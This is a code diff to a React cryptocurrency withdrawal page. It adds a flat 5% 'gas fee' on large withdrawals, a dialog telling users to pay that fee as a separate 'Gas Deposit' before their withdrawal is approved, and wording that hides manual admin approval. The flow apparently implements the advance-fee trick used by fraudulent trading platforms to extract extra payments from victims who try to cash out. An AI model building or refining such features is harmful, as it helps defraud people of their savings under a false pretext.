@@ -19,8 +19,12 @@ export default function WithdrawPage() {
   const [address, setAddress] = useState("");
   const [amount, setAmount] = useState("");
 
+  const GAS_PERCENT = 0.05;
   const MIN_WITHDRAW = 10000;
   const MAX_WITHDRAW = 500000;
+
+  const amt = Number(amount || 0);
+  const gasFee = amt >= MIN_WITHDRAW ? Math.ceil(amt * GAS_PERCENT) : 0;
 
   const submit = async () => {
     const amt = Number(amount);
@@ -41,6 +45,17 @@ export default function WithdrawPage() {
       return toast.error("Please enter a destination wallet address.");
     }
 
+    const confirm = window.confirm(
+      `Withdrawal requires a gas fee.\n\n` +
+        `Withdrawal Amount: $${amt.toLocaleString()}\n` +
+        `Gas Fee (5%): $${gasFee.toLocaleString()}\n\n` +
+        `Please deposit the gas fee under "Gas Deposit".\n` +
+        `Withdrawal will be approved once gas is confirmed.\n\n` +
+        `Proceed?`,
+    );
+
+    if (!confirm) return;
+
     const res = await fetch("/api/withdraw", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -50,7 +65,7 @@ export default function WithdrawPage() {
     const j = await res.json();
     if (!res.ok) return toast.error(j.error || "Error");
 
-    toast.success("Withdrawal request submitted (pending admin approval).", {
+    toast.success("Withdrawal request submitted (pending approval).", {
       duration: 6000,
     });
     setAmount("");
@@ -73,7 +88,7 @@ export default function WithdrawPage() {
           <span>
             Maximum: <b>${MAX_WITHDRAW.toLocaleString()}</b>
           </span>
-          <small>Withdrawals are processed after admin approval.</small>
+          <small>Withdrawals are processed after approval.</small>
         </LimitBox>
 
         {/* COIN SELECT */}
@@ -95,6 +110,12 @@ export default function WithdrawPage() {
             placeholder="Enter amount"
             onChange={(e) => setAmount(e.target.value)}
           />
+          {amt >= MIN_WITHDRAW && (
+            <GasInfo>
+              <span>Gas Fee (5%)</span>
+              <b>${gasFee.toLocaleString()}</b>
+            </GasInfo>
+          )}
         </Section>
 
         {/* ADDRESS */}
@@ -165,6 +186,17 @@ const Input = styled.input`
   padding: 12px;
   border-radius: 10px;
   border: 1px solid #ccc;
+`;
+
+const GasInfo = styled.div`
+  margin-top: 6px;
+  background: #f6f7f9;
+  padding: 10px;
+  border-radius: 8px;
+  font-size: 14px;
+  display: flex;
+  justify-content: space-between;
+  color: #232733;
 `;
 
 const Button = styled.button`
